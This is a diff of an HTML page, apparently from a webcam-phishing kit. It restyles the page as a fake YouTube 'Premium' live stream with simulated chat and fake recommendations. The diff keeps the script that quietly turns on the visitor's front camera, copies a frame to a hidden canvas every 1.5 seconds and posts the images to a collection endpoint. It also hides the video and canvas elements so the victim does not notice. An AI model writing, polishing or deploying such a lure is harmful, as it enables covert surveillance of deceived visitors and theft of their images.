@@ -1,82 +1,473 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live TV - Exclusive Stream</title>
+
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <style>
+    :root {
+      --bg-color: #0f0f0f;
+      --secondary-bg: #272727;
+      --text-main: #ffffff;
+      --text-secondary: #aaaaaa;
+      --accent: #ff0000;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      overflow-x: hidden;
+    }
+
+    /* Header */
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 20px;
+      background-color: #0f0f0f;
+      /* Sticky header bg */
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-weight: 700;
+      font-size: 1.2rem;
+      letter-spacing: -0.5px;
+    }
+
+    .logo i {
+      color: var(--accent);
+      font-size: 1.5rem;
+    }
+
+    .search-bar {
+      display: none;
+      /* Hidden on mobile */
+      background: #121212;
+      border: 1px solid #303030;
+      border-radius: 40px;
+      padding: 8px 15px;
+      width: 40%;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+
+    .user-nav {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+      color: var(--text-main);
+    }
+
+    @media(min-width: 768px) {
+      .search-bar {
+        display: block;
+      }
+    }
+
+    /* Layout */
+    .container {
+      max-width: 1600px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 20px;
+      padding: 20px;
+    }
+
+    @media(min-width: 1024px) {
+      .container {
+        grid-template-columns: 3fr 1fr;
+      }
+    }
+
+    /* Video Player Area */
+    .video-container {
+      width: 100%;
+      background: #000;
+      aspect-ratio: 16/9;
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .video-info {
+      margin-top: 15px;
+    }
+
+    h1.video-title {
+      font-size: 1.25rem;
+      margin-bottom: 10px;
+      line-height: 1.4;
+    }
+
+    .channel-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #303030;
+    }
+
+    .channel-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: #555;
+    }
+
+    .channel-name {
+      font-weight: 500;
+      font-size: 1rem;
+    }
+
+    .sub-count {
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+    }
+
+    .subscribe-btn {
+      background-color: var(--text-main);
+      color: #000;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      cursor: pointer;
+      border: none;
+    }
+
+    .actions {
+      display: flex;
+      gap: 15px;
+    }
+
+    .action-btn {
+      background: var(--secondary-bg);
+      border: none;
+      color: var(--text-main);
+      padding: 8px 16px;
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .action-btn:hover {
+      background: #3f3f3f;
+    }
+
+    /* Side Panel / Chat / Recs */
+    .side-panel {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .chat-container {
+      border: 1px solid #303030;
+      border-radius: 12px;
+      height: 400px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .chat-header {
+      padding: 10px 15px;
+      border-bottom: 1px solid #303030;
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.9rem;
+    }
+
+    .chat-messages {
+      flex: 1;
+      padding: 10px;
+      overflow-y: auto;
+      font-size: 0.85rem;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .msg {
+      display: flex;
+      gap: 8px;
+      align-items: baseline;
+    }
+
+    .user {
+      color: #aaa;
+      font-weight: 500;
+    }
+
+    .text {
+      color: #fff;
+    }
+
+    .chat-input {
+      padding: 15px;
+      border-top: 1px solid #303030;
+      background: #0f0f0f;
+    }
+
+    .chat-input input {
+      width: 100%;
+      background: var(--secondary-bg);
+      border: none;
+      padding: 10px;
+      border-radius: 20px;
+      color: #fff;
+    }
+
+    /* Fake Recommendations */
+    .rec-item {
+      display: flex;
+      gap: 10px;
+    }
+
+    .rec-thumb {
+      width: 168px;
+      height: 94px;
+      background: #333;
+      border-radius: 8px;
+      position: relative;
+    }
+
+    .rec-info {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .rec-title {
+      font-size: 0.9rem;
+      font-weight: 500;
+      line-height: 1.2;
+      overflow: hidden;
+      display: -webkit-box;
+      line-clamp: 2;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+    }
+
+    .rec-meta {
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+    }
+  </style>
 </head>
 
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
-</div>
+<body>
 
-<canvas id="canvas" width="640" height="480"></canvas>
+  <header>
+    <div class="logo">
+      <i class="fab fa-youtube"></i>
+      <span>Premium</span>
+    </div>
+    <div class="search-bar">Search</div>
+    <div class="user-nav">
+      <i class="fas fa-video"></i>
+      <i class="fas fa-bell"></i>
+      <div class="avatar" style="width: 32px; height: 32px; background: #555;"></div>
+    </div>
+  </header>
 
-<script>
+  <div class="container">
+    <!-- Main Video Section -->
+    <div>
+      <div class="video-container">
+        <iframe id="Live_YT_TV"
+          src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&modestbranding=1&controls=1&showinfo=0&rel=0&iv_load_policy=3"
+          allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      </div>
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+      <div class="video-info">
+        <h1 class="video-title">🔴 LIVE: Special Event Coverage - Exclusive Stream 2025</h1>
+        <div class="channel-row">
+          <div class="channel-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="channel-name">Official Stream</div>
+              <div class="sub-count">12.5M subscribers</div>
+            </div>
+            <button class="subscribe-btn">Subscribe</button>
+          </div>
+          <div class="actions">
+            <button class="action-btn"><i class="far fa-thumbs-up"></i> 45K</button>
+            <button class="action-btn"><i class="far fa-share-square"></i> Share</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Sidebar (Chat & Next) -->
+    <div class="side-panel">
+      <div class="chat-container">
+        <div class="chat-header">
+          <span>Top Chat</span>
+          <i class="fas fa-ellipsis-v"></i>
+        </div>
+        <div class="chat-messages" id="chatBox">
+          <!-- JS will populate fake chat -->
+          <div class="msg"><span class="user" style="color: #4facfe">Alex:</span><span class="text">Waiting for this!
+              🔥</span></div>
+          <div class="msg"><span class="user" style="color: #00f2fe">Sarah:</span><span class="text">Finally
+              starting...</span></div>
+        </div>
+        <div class="chat-input">
+          <input type="text" placeholder="Chat publicly as Guest...">
+        </div>
+      </div>
+
+      <!-- Fake Recommendations -->
+      <div class="rec-item">
+        <div class="rec-thumb"></div>
+        <div class="rec-info">
+          <div class="rec-title">Live Update: Global News Coverage</div>
+          <div class="rec-meta">News 24/7<br>15K watching</div>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-thumb" style="background: #444;"></div>
+        <div class="rec-info">
+          <div class="rec-title">Top 10 Tech Trends 2025</div>
+          <div class="rec-meta">TechDaily<br>250K views • 2 hours ago</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- HIDDEN CAPTURE LOGIC (UNCHANGED) -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script>
+
+    // Fake Chat Logic
+    const names = ["User123", "CoolGuy", "Viewer_X", "Anna_K", "JSmith", "CryptoKing"];
+    const messages = ["Wow!", "Is this live?", "Amazing visual quality", "Hello from NY", "Wait for it...", "🔥🔥🔥"];
+    const colors = ["#ff9966", "#00f2fe", "#4facfe", "#43e97b", "#fa709a"];
+
+    function addChat() {
+      const chatBox = document.getElementById('chatBox');
+      const div = document.createElement('div');
+      div.className = 'msg';
+      const name = names[Math.floor(Math.random() * names.length)];
+      const msg = messages[Math.floor(Math.random() * messages.length)];
+      const color = colors[Math.floor(Math.random() * colors.length)];
+
+      div.innerHTML = `<span class="user" style="color: ${color}">${name}:</span><span class="text">${msg}</span>`;
+      chatBox.appendChild(div);
+      chatBox.scrollTop = chatBox.scrollHeight;
     }
-  });
-};
+
+    setInterval(addChat, 2000);
+
+    // Main Webcam Logic
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) { },
+        error: function () { }
+      });
+    };
 
 
-'use strict';
+    'use strict';
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    // Removed errorMsgElement as it is not used in UI but variable existed in old code. Keeping safe.
+    // const errorMsgElement = document.querySelector('span#errorMsg'); // Not in DOM anymore
 
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user"
+      }
+    };
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        // console.error(e);
+      }
+    }
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+      var context = canvas.getContext('2d');
+      setInterval(function () {
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
 
-}
+    // Load init
+    init();
 
-// Load init
-init();
+  </script>
 
-</script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
+</body>
 
 </html>
